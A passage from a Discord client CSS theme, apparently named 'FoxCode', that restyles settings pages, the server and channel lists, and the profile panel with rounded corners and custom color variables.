/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --accentcolor: 4,216,105;
    --linkcolor: 4,216,105;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Audioviz |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

--audioviz: var(--Color001);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| SettingsIcons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --settings-icon-color: var(--Color007);
    --settings-subscriptions: var(--Color007);
    --settings-hypesquad: var(--Color007);
    --settings-logout: #f04747;
    --settings-alt-focused: var(--Color007);
    --settings-guild-premium: var(--Color007);
    --settings-guild-delete: #f04747;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Windows 10 Titlebar ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --titlebar-height: 30px;
    --titlebar-drag-margin: 4px;
    --titlebar-button-width: 48px;
    --titlebar-font-size: 12px;
    --titlebar-icon-font-size: 12px;
    --titlebar-background-color: var(--Color005);
    --titlebar-text-color: var(--Color007);
    --titlebar-button-hover: var(--Color003);
    --titlebar-button-active: var(--Color003);
    --titlebar-close-button-hover: var(--Color001);
    --titlebar-close-button-active: var(--Color001);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Radius |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --Radius001: 24px; /* The value should not exceed 24px. */
    --Radius002: 90px; /* The value should not exceed 90px. */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Variables ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --background-primary: var(--Color004);
    --background-secondary: var(--Color005);
    --background-secondary-alt: var(--Color002);
    --background-tertiary: var(--Color005);
    --background-accent: var(--Color001);
    --background-floating: var(--Color005);
    --background-modifier-hover: var(--Color004);
    --background-modifier-active: var(--Color004);
    --background-modifier-selected: var(--Color001);
    --background-modifier-accent: var(--Color002);
    --channeltextarea-background: var(--Color001);
    --deprecated-card-bg: var(--Color004);
    --deprecated-card-editable-bg: var(--Color004);
    --deprecated-text-input-bg: var(--Color005);
    --deprecated-text-input-border: var(--Color005);
    --deprecated-text-input-border-disabled: var(--Color005);
    --activity-card-background: var(--Color004);
    --channels-default: var(--Color008);
    --interactive-normal: var(--Color008);
    --interactive-hover: var(--Color006);
    --interactive-active: var(--Color006);
    --interactive-muted: var(--Color009);
    --header-primary: var(--Color006);
    --toast-background: var(--Color006);
    --toast-header: var(--Color005);
    --toast-contents: var(--Color006);
    --toast-box-shadow: rgba(0, 0, 0, .2);
    --toast-border: var(--Color005);
    --header-secondary: var(--Color008);
    --channel-list: var(--Color003);
    --offline-color: var(--Color004);
    --text-normal: var(--Color007);
    --text-muted: var(--Color009);
    --spotify-color: var(--Color001);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Mention ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Mention */

.mention-1f5kbO {
    background: var(--Color001);
    opacity: 1;
    height: 20px;
    border-radius: 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Version */

.info-1VyQPT .size12-3cLvbJ:last-child::after{
    content: "\a FoxCode " var(--version);
    text-transform: none;
    white-space: pre;
}

/* Background */
.sidebarRegionScroller-3MXcoP, .contentRegionScroller-26nc1e {
    background: var(--Color003);
}

/* Sidebar */
.sidebar-CFHs9e {
    background: var(--Color004);
    border-radius: 24px;
    padding: 30px 20px 20px 20px;
    margin: 60px 0px 60px 0px;
    width: 240px;
}

.header-2RyJ0Y {
    font-size: 12px;
    font-weight: 700;
    line-height: 16px;
    text-transform: uppercase;
    color: var(--Color008);
}

/* Content */
.contentColumnDefault-1VQkGM {
	background: var(--Color004);
   	border-radius: 24px;
   	padding-top: 30px;
	margin-top: 60px;
	margin-left: 60px;
	margin-right: 60px;
	margin-bottom: 60px;
}

/* Highlight */
.side-8zPYf6 .themed-OHr7kt.selected-3s45Ha.item-PXvHYJ, .topPill-30KHOu .themed-OHr7kt.selected-3s45Ha.item-PXvHYJ {
    background: var(--Color001);
	border-radius: 90px;
}

.side-8zPYf6 .item-PXvHYJ {
	border-radius: 90px;
}

/* Card */
.card-3Qj_Yx {
	background: var(--Color003);
    border-radius: 24px;
    position: relative;
    border: none;
}

/* Buttons */
.lookOutlined-3sRXeN.colorRed-1TFJan {
    background: var(--Color005);
    color: var(--Color008);
    border: none;
}

.lookOutlined-3sRXeN.colorBrand-3pXr91 {
    background: var(--Color005);
    color: var(--Color008);
    border: none;
}

/* Dropdown*/
.css-1a8reka-control {
    background: var(--Color005);
    border-radius: 90px;
    border: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | My Account |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Profile */
.userSettingsAccount-2eMFVR .userInfoEditing-1CEzdT, .userSettingsAccount-2eMFVR .userInfoViewing-16kqK3 {
    background: var(--Color003);
    border-radius: 24px;
    padding: 20px;
}



/* Two-Factor | Background */
.root-1gCeng {
    border-radius: 24px;
  }

.header-1TKi98 {
    background: var(--Color003);
    border-radius: 24px 24px 0 0;
}

.content-1LAB8Z {
    background-color: var(--Color003);
    border-radius: 24px 24px;
}

.theme-dark .root-1gCeng {
    background-color: var(--Color003);
	box-shadow: var(--shadow001);
}

.theme-dark .separator-2-RRj_ {
    filter: brightness(110%) ;
    box-shadow: none;
}

.theme-dark .footer-2gL1pp {
    background: var(--Color005);
    border-radius: 0 0 24px 24px;
}

/* Two-Factor | Input */
.input-cIJ7To {
    border-radius: 24px;
    background-color: var(--Color005);
    border: none;
}

/* Two-Factor Button */
.grow-q77ONN, .sizeIcon-1-kvKI {
  border-radius: 24px;
}

/* Two-Factor Text */
.userSettingsSecurity-3IYeMF .isEnabled-24g9qA {
    color: var(--Color010);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Privacy & Safety |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Round Checkbox */
.box-mmYMsp {
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Authorized Apps ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Connections ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Social Icons Background */
.accountBtn-2Nozo3 .accountBtnInner-sj5jLs {
    background-color: var(--Color003);
	border-radius: 90px;
}

/* Social Card */
.theme-dark .elevationLow-2lY09M {
    -webkit-box-shadow: none;
    box-shadow: none;
	border-radius: 24px;
}

.connectionHeader-2MDqhu {
    background: transparent;
}

.connectionDelete-2Odoln {
    border: 1px solid var(--Color006);
    border-radius: 90px;
}

.connectionDelete-2Odoln:hover {
    border: 1px solid var(--Color007);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Billing ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Indicator */

.theme-dark .defaultIndicator-G3c16x {
    background: var(--Color002);
    color: var(--Color007);
	border-radius: 90px;
}

.theme-dark .premiumIndicator-1XvbfM {
    background: var(--Color001);
    color: #fff;
	border-radius: 90px;
}

/* Payment History | Background*/

.theme-dark .paginator-166-09 {
    background-color: var(--Color004);
}

/* Payment History | Header */

.theme-dark .paymentPane-3bwJ6A{
    background: var(--Color003);
    border-radius: 24px 24px 0 0;
    color: var(--Color007);
}

/* Payment History | Items */

.theme-dark .payment-xT17Mq {
    background: var(--Color002);
    color: var(--Color008);
}

/* Payment History | Footer */

.pageActions-1SVAnA {
    background: var(--Color003);
    border-radius: 0 0 24px 24px;
    color: var(--Color007);
}


.theme-dark .bottomDivider-1K9Gao {
    border-bottom-color: var(--Color003);
}

.theme-dark .expandedInfo-3kfShd {
    background: var(--Color003);
	border-radius: 24px;
}


/* Payment History | Buttons */

.theme-dark .pageButtonNext-V2kUq0, .pageButtonPrev-1Y-47D, .pageIndicator-1gAbyA {
    border: none;
    background: var(--Color003);
}

.pageButtonPrev-1Y-47D, .pageButtonNext-V2kUq0 {
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Subscriptions |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Banner */

.tier2-3hSil0.banner-3Kac2g {
    background: var(--Color001);
    border-radius: 24px;
}

.bannerBackgroundImage-1DMjWi {
	border-radius: 24px;
}

/* No Header */

.hero-EvfTTA {
    display: none;
}

.detailsBlock-FoDTGA {
    background: var(--Color003);
    border-radius: 24px;
}

.hero-EvfTTA {
    border-radius: 24px;
}

/* Input */

.lookFilled-1h1y05.select-1Pkeg4 {
    background: var(--Color005);
    border-radius: 24px;
    border: none;
}

.lookFilled-1h1y05.popout-2sKjHu {
    background: var(--Color005);
    border-radius: 24px;
    border: none;
    margin-top: -38px;

}

.optionActive-KkAdqq, .optionFocused-8MflSE {
    background: var(--Color005);
}

.lookFilled-1h1y05 .arrow-2KJjTM {
    z-index: 20;
    color: var(--Color007);
}

/* Nitro Includes */

.base-1x0h_U {
    color: var(--Color007);
}

.size32-o_H79z {
    font-size: 22px;
    line-height: 20px;
}

.theme-dark .feature-2w65J5 {
    background: var(--Color003);
}

.feature-2w65J5 {
    border-radius: 24px;
    min-height: 90px;
}

.featureGrid-3-fNl- {
    grid-template-columns: repeat(auto-fill,322px);
}

.featureImageWrapper-pPDLjm {
    display: none;
}

/* Buy Nitro */

.marketingRefreshTier2Cta-bw9Vyc {
    background: var(--Color003);
    border-radius: 24px;
    padding: 24px;
    text-align: center;
    margin-top: 48px;
    border: none;
}

/* Buy Nitro Classic */

.marketingRefreshTier1Logo-sY6Lgd {
    color: var(--header-primary);
    display: block;
    height: 20px;
    margin-bottom: 8px;
    width: 194px;
}

.marketingRefreshSectionTier1-dRwS-6 {
    background: var(--Color003);
    border-radius: 24px;
    padding: 24px;
    text-align: center;
    margin-top: 48px;
    border: none;
}


.marketingRefreshTier1Graphic-9B12wx {
    display: none;
    height: 148px;
    margin-right: 60px;
    width: 175px;
}
/* Buy Nitro Classic | Buttons */

.buttons-2-EdE8 {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    justify-content: center;
}

/* Info */

.finePrint-ULGqdp {
    border: none;
}

.finePrint-ULGqdp {
    background: var(--Color005);
    border-radius: 24px;
    padding: 24px;
    font-size: 13px;
    line-height: 16px;
    text-align: justify;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Gift Inventory ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/



/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Server Boost ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Active Server Boost */

.guildHeader-3nh5RK {
    border-radius: 24px 24px 0 0;
    background-color: var(--Color003);
}

.guildSubscriptionSlots-JPXXvN {
    background-color: var(--Color003);
}

.guildHeaderBackground-1G51bM {
    display: none;
}

/* Icons */

.memberBadgeIcon-1hpSQc, .roleIcon-F8XDd3, .emojiIcon-2xOPMD, .audioQualityIcon-1KNkhv, .uploadSizeIcon-2HNa5p {
    color: var(--Color001);
}

/* Cards */

.cardWrapper-2Min21 {
    border-radius: 24px;
}

/* No Logo */

.marketingLogo-1D8DV6 {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | HypeSquad |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.membershipDialogHouse2-35h9SY {
    background-color: var(--Color001);
    border-radius: 24px;
}

.videoWrapper-3YdgHH {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Voice & Video |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.videoGridWrapper-2BDlMX {
    background: #000;
}

/* Grabber */

.grabber-3mFHz2 {
    background-color: var(--Color006);
    border-radius: 90px;
    height: 16px;
    width: 16px;
    margin-top: -8.5px;
    margin-left: -5px;
}

/* Mic Test */

.theme-dark .notches-1sAcEM.gray-3_LNYR {
    display: none;

}

.theme-dark .progress-1IcQ3A, .wrapper-3Z-vWm {
    background: var(--Color003);

}

.wrapper-3Z-vWm {
    background: var(--Color003);

}

/* Preview */

.theme-dark .userSettingsVoice-iwdUCU .previewOverlay-2O7_KC {
    background: var(--Color005);
    border-radius: 24px;
}

.userSettingsVoice-iwdUCU .media-engine-video {
    border-radius: 24px;
    border: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Overlay |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Notifications |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Keybinds ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Game Activity |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-dark .card-FDVird{
    background: var(--Color003);
    border-radius: var(--Radius002);
    box-shadow: none;
}

.theme-dark .card-FDVird::before{
    background: var(--Color003);
    border-radius: var(--Radius002);
    box-shadow: none;
}

/* Add Game */

.theme-dark .notDetected-33MY4s, .theme-light .notDetected-33MY4s {
    background: var(--Color002);
    border-radius: var(--Radius002);

}

/* Game */

.game-1ipmAa {
    position: relative;
    padding: 20px;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Text & Images |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Appearance ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Streamer Mode |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Language ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .codeRedemptionRedirect-1wVR4b {
    color: var(--Color007);
    background: var(--Color005);
    border: none;
}

.theme-dark .item-3eFBNF.selected-2DeaDa {
    background: var(--Color002);
    border-radius: var(--Radius002);
    box-shadow: none;
}

.theme-dark .item-3eFBNF {
    background: var(--Color003);
    border-radius: var(--Radius002);
    margin-top: 20px;
    padding: 20px;
    box-shadow: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Windows Settings ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Change Log ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* No Guild Separator */

#app-mount .wrapper-1Rf91z.guilds-1SWlCJ .guildSeparator-3s64Iy {
    display: none;
}

/* Background */

.guilds-1SWlCJ .scroller-2TZvBN {
    padding-top: 80px;
    padding-bottom: 80px;
}

.wrapper-1Rf91z {
    background-color: transparent;
}

.scroller-2TZvBN {
    background-color: var(--Color004);
	border-radius: 0 38px 38px 0;
	margin-bottom: 25px;
	margin-top: 12px;
    contain: unset !important;
}

.layer-3QrUeG.baseLayer-35bLyl {
    background: var(--Color003);
}

/* Button Color */

.childWrapper-anI2G9 {
    background: var(--Color003);
    color: var(--Color008);
}

.circleIconButton-jET_ig {
    color: var(--Color008);
    background-color: var(--Color003);
}

/* Home Button */

.tutorialContainer-1v44GL {
    background: var(--Color005);
	border-radius: 0 90px 90px 0;
    position: fixed;
    z-index: 3;
	padding-bottom: 4px;
    padding-top: 10px;
    top:calc(var(--titlebar-height) + 13px);
    margin-top: 11.6px;
}

/* Create Server Button */

.tutorialContainer-SGrQ1h {
    background: var(--Color005);
	border-radius: 0 90px 90px 0;
    position: fixed;
    z-index: 3;
	padding-bottom: 4px;
    padding-top: 12px;
    margin-bottom: 23px;
    bottom: calc(var(--titlebar-height) -0px);
}


/* Closed Folder */

.closedFolderIconWrapper-15K9MK {
    background: var(--Color004);
}

/* Open Folder */

.folder-21wGz3 {
    border-radius: 90px;
    background-color: var(--Color002);
}

.expandedFolderBackground-2sPsd- {
    background: var(--Color003);
    border-radius: 90px;
}

/* Round Home Button */

.wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9, .wrapper-1BJsBx:hover .childWrapper-anI2G9 {
    background: var(--Color001);
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Channel Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.container-PNkimc {
    background: var(--Color003);
}

/* background */

.clickable-2ap7je {
    background: var(--Color004);
}

.clickable-2ap7je {
	border-radius: 24px 24px 0 0;
}

.clickable-2ap7je .header-2o-2hj {
    background: transparent;
    height: 46px;
}

.animatedContainer-1pJv5C, .bannerImage-1jOskm {
	z-index: 2;
	border-radius: 24px;
    position: absolute;
    height: 120px;
}

.sidebar-2K8pFh {
    width: 236px;
}

.scroller-2wx7Hm {
    background: var(--Color004);
	padding-bottom: 30px;
    border-radius: 0px;
    margin-bottom: -30px;
}

/* Content */

.containerDefault-1ZnADq, .clickable-18m--O {
	padding-right: 8px;
}

/* Selector */

.modeSelected-1zApJ_ .content-3at_AU, .modeSelected-1zApJ_:hover .content-3at_AU {
    background-color: var(--Color003);
	border-radius: 90px;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Profile Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Game */

.panel-24C3ux {
	z-index: 9;
	position: relative;
    background: var(--Color005);
    border-radius: var(--Radius001) var(--Radius001) 0 0;
    padding-bottom: 80px;
    margin-bottom: -70px;
}

/* Voice */

.container-1giJp5 {
	z-index: 9;
    position: relative;
    background: var(--Color005);
	border-radius: var(--Radius001);
